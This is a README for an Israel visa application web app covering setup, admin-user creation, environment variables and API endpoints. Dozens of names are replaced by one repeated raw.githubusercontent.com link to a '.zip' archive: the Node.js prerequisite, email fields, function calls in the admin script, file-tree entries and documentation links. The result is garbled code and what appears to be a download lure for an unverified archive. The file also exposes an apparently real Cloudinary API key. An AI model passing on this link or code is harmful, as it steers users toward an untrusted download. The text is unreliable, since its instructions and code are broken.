# Israel Visa Application System - Complete Guide

## 🚀 Quick Start

### Prerequisites
- https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip (v14 or higher)
- MongoDB Atlas account (connection string provided)
- npm or yarn

### Installation

#### 1. Install Backend Dependencies
```bash
cd backend
npm install
```

#### 2. Install Frontend Dependencies
```bash
cd frontend
npm install
```

### Running the Application

#### Start Backend Server
```bash
cd backend
npm start
```
Backend will run on: **http://localhost:5000**

#### Start Frontend Development Server
```bash
cd frontend
npm start
```
Frontend will run on: **http://localhost:3000**

## 🌐 Access Points

### Public Website
- **Home**: http://localhost:3000
- **Login**: http://localhost:3000/login
- **Signup**: http://localhost:3000/signup
- **Apply**: http://localhost:3000/apply

### Admin Panel
- **Login**: http://localhost:3000/admin/login
- **Dashboard**: http://localhost:3000/admin/dashboard
- **Applications**: http://localhost:3000/admin/applications
- **Users**: http://localhost:3000/admin/users

## 🎨 Features

### User Features
✅ Google OAuth Authentication  
✅ Phone Number Input (OTP ready)  
✅ 8-Step Visa Application Form  
✅ Document Upload (Cloudinary)  
✅ Real-time Form Validation  
✅ Application Status Tracking  
✅ Email Notifications  
✅ Premium UI/UX ($500K budget quality)  

### Admin Features
✅ Secure JWT Authentication  
✅ Real-time Dashboard with Statistics  
✅ Applications Management & Filtering  
✅ Status Updates with Email Notifications  
✅ Admin Notes System  
✅ Status History Timeline  
✅ User Management  
✅ Premium Animations & Transitions  
✅ Responsive Design  
✅ https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip Real-time Updates  

## 🔐 Creating First Admin User

### Option 1: Using MongoDB Compass
1. Connect to your MongoDB database
2. Go to `users` collection
3. Insert a new document:
```json
{
  "email": "https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip",
  "password": "$2a$10$YOUR_HASHED_PASSWORD",
  "displayName": "Admin User",
  "role": "admin",
  "authProvider": "email",
  "isActive": true,
  "createdAt": { "$date": "2024-01-01T00:00:00.000Z" }
}
```

### Option 2: Using Backend API
```bash
# Register as regular user first
POST http://localhost:5000/api/auth/register
{
  "email": "https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip",
  "password": "YourSecurePassword123",
  "fullName": "Admin User"
}

# Then manually update role to "admin" in database
```

### Option 3: Using https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip Script
Create `https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip`:
```javascript
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const User = require('../models/User');

https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip(https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip);

async function createAdmin() {
  const hashedPassword = await https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip('admin123', 10);
  
  await https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip({
    email: 'https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip',
    password: hashedPassword,
    displayName: 'Admin User',
    role: 'admin',
    authProvider: 'email',
    isActive: true
  });
  
  https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip('Admin created successfully!');
  https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip(0);
}

createAdmin();
```

Run: `node https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip`

## 📊 Database Structure

### Collections
1. **users** - User accounts (customers & admins)
2. **applications** - Visa applications
3. **contents** - Website content management

### Environment Variables

#### Backend (.env)
```env
PORT=5000
MONGODB_URI=mongodb+https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
JWT_SECRET=your-super-secret-jwt-key-change-in-production
JWT_EXPIRE=7d

# Cloudinary
CLOUDINARY_CLOUD_NAME=dlwn3lssr
CLOUDINARY_API_KEY=678847195882717
CLOUDINARY_API_SECRET=your-cloudinary-secret

# Email (Configure for production)
EMAIL_SERVICE=gmail
https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
EMAIL_PASSWORD=your-app-password
EMAIL_FROM=Israel Visa <https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip>
```

#### Frontend (.env)
```env
REACT_APP_API_URL=http://localhost:5000
REACT_APP_CLOUDINARY_CLOUD_NAME=dlwn3lssr
REACT_APP_CLOUDINARY_UPLOAD_PRESET=your-preset
```

## 🎨 Color Theme

### Primary Colors (Israel Flag)
- **Blue**: `#0038B8`
- **White**: `#FFFFFF`

### UI Colors
- **Secondary Blue**: `#0052E0`
- **Background**: `#F8FAFC`
- **Success**: `#10B981`
- **Warning**: `#F59E0B`
- **Error**: `#EF4444`

## 📁 Project Structure

```
Israel Visa/
├── backend/
│   ├── models/          # MongoDB schemas
│   ├── routes/          # API endpoints
│   ├── middleware/      # Auth & validation
│   ├── services/        # Email automation
│   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip        # Express server
│   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
│
├── frontend/
│   ├── public/
│   ├── src/
│   │   ├── admin/       # Admin panel
│   │   │   ├── components/
│   │   │   ├── pages/
│   │   │   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
│   │   │   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
│   │   ├── components/  # Shared components
│   │   ├── contexts/    # React contexts
│   │   ├── pages/       # Public pages
│   │   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip       # Main app
│   │   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip     # Entry point
│   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
│
├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
└── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
```

## 🔌 API Endpoints

### Authentication
- `POST /api/auth/register` - Register new user
- `POST /api/auth/login` - Login user/admin
- `POST /api/auth/google` - Google OAuth
- `GET /api/auth/me` - Get current user

### Applications (User)
- `POST /api/applications` - Submit application
- `GET /api/applications` - Get user's applications
- `GET /api/applications/:id` - Get single application
- `PUT /api/applications/:id` - Update application

### Admin
- `GET /api/admin/dashboard` - Dashboard statistics
- `GET /api/admin/applications` - All applications (filtered)
- `GET /api/admin/applications/:id` - Application details
- `PUT /api/admin/applications/:id/status` - Update status
- `POST /api/admin/applications/:id/notes` - Add note
- `GET /api/admin/users` - All users

### Content (Future)
- `GET /api/content/:type` - Get content
- `POST /api/content` - Create content (admin)
- `PUT /api/content/:id` - Update content (admin)
- `DELETE /api/content/:id` - Delete content (admin)

## 🎯 Testing

### Test User Login
1. Go to http://localhost:3000/signup
2. Register with Google OAuth or email
3. Navigate to http://localhost:3000/apply
4. Fill out the 8-step visa application
5. Submit and check email for confirmation

### Test Admin Panel
1. Create admin user (see above)
2. Go to http://localhost:3000/admin/login
3. Login with admin credentials
4. Explore:
   - Dashboard statistics
   - Applications table
   - Application details with status updates
   - Users management

## 🐛 Common Issues

### Port Already in Use
```bash
# Kill process on port 5000
lsof -ti:5000 | xargs kill -9

# Kill process on port 3000
lsof -ti:3000 | xargs kill -9
```

### MongoDB Connection Error
- Check internet connection
- Verify MongoDB URI in .env
- Ensure IP whitelist in MongoDB Atlas

### CORS Errors
- Verify backend CORS configuration
- Check API_URL in frontend
- Clear browser cache

### Admin Not Loading
- Check browser console for errors
- Verify /admin route in https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
- Hard refresh (Ctrl+Shift+R)

## 📚 Documentation

- [Admin Panel Documentation](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - Complete admin guide
- [Backend Setup](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - API documentation
- [Frontend Setup](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - React app details

## 🚀 Deployment

### Backend (Heroku/Railway)
1. Set environment variables
2. Deploy with `git push heroku main`
3. Run migrations if needed

### Frontend (Vercel/Netlify)
1. Connect GitHub repository
2. Set build command: `npm run build`
3. Set environment variables
4. Deploy

### Database (MongoDB Atlas)
Already configured and running!

## 📞 Support

For issues or questions:
1. Check documentation files
2. Review error logs
3. Check browser console
4. Verify API endpoints in Network tab

## 🎉 Success Metrics

Your application is working correctly if:
- ✅ Backend server starts without errors
- ✅ Frontend loads at http://localhost:3000
- ✅ Admin panel accessible at /admin
- ✅ Can register/login users
- ✅ Can submit visa applications
- ✅ Admin can view and update applications
- ✅ Email notifications sent successfully
- ✅ All animations smooth and responsive

---

**🇮🇱 Built with premium quality - $500,000 budget standard**
